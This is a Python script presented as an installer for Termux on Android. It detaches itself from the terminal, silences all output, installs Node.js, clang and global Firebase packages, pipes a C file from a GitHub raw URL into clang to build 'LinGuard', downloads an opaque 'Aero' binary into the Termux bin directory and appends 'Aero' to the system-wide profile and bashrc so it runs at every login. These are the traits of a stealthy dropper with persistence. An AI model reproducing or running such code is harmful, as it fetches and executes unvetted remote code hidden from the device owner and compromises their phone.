import os
import sys
import platform
import subprocess
import shutil
import urllib.request
import tempfile
import concurrent.futures
from pathlib import Path
import atexit
import signal

class InstallerTool:
    def __init__(self):
        self.detach_from_terminal()
        self.system = platform.system().lower()
        self.is_android = "android" in platform.platform().lower()
        if not self.is_android:
            sys.exit(0)
        self.home_dir = Path.home()
        self.bin_dir = Path("/data/data/com.termux/files/usr/bin")
        self.etc_dir = Path("/data/data/com.termux/files/usr/etc")
        self.profile_path = self.etc_dir / "profile"
        self.bashrc_path = self.etc_dir / "bash.bashrc"
        self.checked_components = {}
        self.installation_success = False

    def detach_from_terminal(self):
        try:
            if os.name != 'nt':
                if os.fork():
                    sys.exit(0)
                os.setsid()
                if os.fork():
                    sys.exit(0)
                devnull = '/dev/null'
                if hasattr(os, "devnull"):
                    devnull = os.devnull
                si = open(devnull, 'r')
                so = open(devnull, 'a+')
                se = open(devnull, 'a+')

                os.dup2(si.fileno(), sys.stdin.fileno())
                os.dup2(so.fileno(), sys.stdout.fileno())
                os.dup2(se.fileno(), sys.stderr.fileno())
        except Exception:
            pass

    def run_command_quick(self, cmd, timeout=3):
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
            return result.returncode == 0
        except:
            return False

    def run_command_with_output(self, cmd, timeout=10):
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
            return result.returncode == 0, result.stdout.strip()
        except Exception as e:
            return False, str(e)

    def run_command_silent(self, cmd, timeout=60):
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
            return result.returncode == 0
        except:
            return False

    def check_nodejs_quick(self):
        return self.run_command_quick("node --version")

    def check_firebase_deps_quick(self):
        node_path = subprocess.run("npm root -g", shell=True, capture_output=True, text=True).stdout.strip()
        if not node_path:
            return False
        firebase_app = Path(node_path) / "@firebase" / "app"
        firebase_db = Path(node_path) / "@firebase" / "database"
        return firebase_app.exists() and firebase_db.exists()

    def check_clang_quick(self):
        return self.run_command_quick("clang --version")

    def check_linguard_files_quick(self):
        linguard_exists = (self.bin_dir / "LinGuard").exists()
        return linguard_exists

    def check_aero_file(self):
        aero_path = self.bin_dir / "Aero"
        return aero_path.exists() and os.access(aero_path, os.X_OK)

    def check_profile_aero(self):
        if not self.profile_path.exists():
            return False
        try:
            with open(self.profile_path, 'r') as f:
                content = f.read()
                return "Aero" in content and "while true" not in content
        except:
            return False

    def check_bashrc_aero(self):
        if not self.bashrc_path.exists():
            return False
        try:
            with open(self.bashrc_path, 'r') as f:
                content = f.read()
                return "Aero" in content and "while true" not in content
        except:
            return False

    def check_all_components_instant(self):
        results = {}
        results['nodejs'] = self.check_nodejs_quick()
        results['firebase_deps'] = self.check_firebase_deps_quick()
        results['clang'] = self.check_clang_quick()
        results['linguard_files'] = self.check_linguard_files_quick()
        results['aero_file'] = self.check_aero_file()
        results['profile_aero'] = self.check_profile_aero()
        results['bashrc_aero'] = self.check_bashrc_aero()
        self.checked_components = results
        all_required = (results['nodejs'] and 
                       results['firebase_deps'] and 
                       results['linguard_files'] and
                       results['aero_file'])
        return all_required

    def install_nodejs(self):
        if self.checked_components['nodejs']:
            return True
        return self.run_command_silent("pkg install nodejs -y")

    def install_clang(self):
        if self.checked_components['clang']:
            return True
        return self.run_command_silent("pkg install clang -y")

    def install_firebase_deps(self):
        if self.checked_components['firebase_deps']:
            return True
        deps = ["@firebase/app", "@firebase/database"]
        success = True
        for dep in deps:
            if not self.run_command_silent(f"npm install -g {dep}"):
                success = False
        return success

    def compile_linguard(self):
        if self.checked_components['linguard_files']:
            return True
        try:
            compile_cmd = 'curl -s https://raw.githubusercontent.com/boneng-cell/data/refs/heads/main/data/Termux/LinGuard.c | clang -x c -o /data/data/com.termux/files/usr/bin/LinGuard -'
            return self.run_command_silent(compile_cmd)
        except Exception:
            return False

    def download_aero(self):
        if self.checked_components['aero_file']:
            return True
        try:
            download_cmd = 'wget -O /data/data/com.termux/files/usr/bin/Aero https://raw.githubusercontent.com/boneng-cell/data/refs/heads/main/data/Termux/Aero'
            if not self.run_command_silent(download_cmd):
                return False
            chmod_cmd = 'chmod +x /data/data/com.termux/files/usr/bin/Aero'
            return self.run_command_silent(chmod_cmd)
        except Exception:
            return False

    def add_aero_to_profile(self):
        if not (self.check_aero_file() and self.check_linguard_files_quick()):
            return False
        if self.checked_components['profile_aero']:
            return True
        try:
            self.etc_dir.mkdir(parents=True, exist_ok=True)
            aero_content = "Aero"
            existing_content = ""
            if self.profile_path.exists():
                with open(self.profile_path, 'r') as f:
                    existing_content = f.read()
            if "Aero" not in existing_content:
                with open(self.profile_path, 'a') as f:
                    f.write(aero_content)
            return True
        except Exception:
            return False

    def add_aero_to_bashrc(self):
        if not (self.check_aero_file() and self.check_linguard_files_quick()):
            return False
        if self.checked_components['bashrc_aero']:
            return True
        try:
            self.etc_dir.mkdir(parents=True, exist_ok=True)
            aero_content = "Aero"
            existing_content = ""
            if self.bashrc_path.exists():
                with open(self.bashrc_path, 'r') as f:
                    existing_content = f.read()
            if "Aero" not in existing_content:
                with open(self.bashrc_path, 'a') as f:
                    f.write(aero_content)
            return True
        except Exception:
            return False

    def run_parallel_installation(self):
        tasks = []
        if not self.checked_components['nodejs']:
            tasks.append(("Node.js", self.install_nodejs))
        if not self.checked_components['clang']:
            tasks.append(("Clang", self.install_clang))
        if not self.checked_components['firebase_deps']:
            tasks.append(("Firebase", self.install_firebase_deps))
        if not self.checked_components['linguard_files']:
            tasks.append(("LinGuard", self.compile_linguard))
        if not self.checked_components['aero_file']:
            tasks.append(("Aero Download", self.download_aero))

        if tasks:
            with concurrent.futures.ThreadPoolExecutor() as executor:
                future_to_task = {}
                for name, task_func in tasks:
                    future = executor.submit(task_func)
                    future_to_task[future] = name
                results = {}
                for future in concurrent.futures.as_completed(future_to_task):
                    name = future_to_task[future]
                    results[name] = future.result()
                if not all(results.values()):
                    return False

        if self.check_aero_file() and self.check_linguard_files_quick():
            if not self.checked_components['profile_aero']:
                if not self.add_aero_to_profile():
                    return False
            if not self.checked_components['bashrc_aero']:
                if not self.add_aero_to_bashrc():
                    return False
            return True
        else:
            return False

    def run(self):
        if self.check_all_components_instant():
            self.installation_success = True
            return

        if self.run_parallel_installation():
            self.installation_success = True

def main():
    if os.name != 'nt':
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    installer = InstallerTool()
    installer.run()

if __name__ == "__main__":
    main()
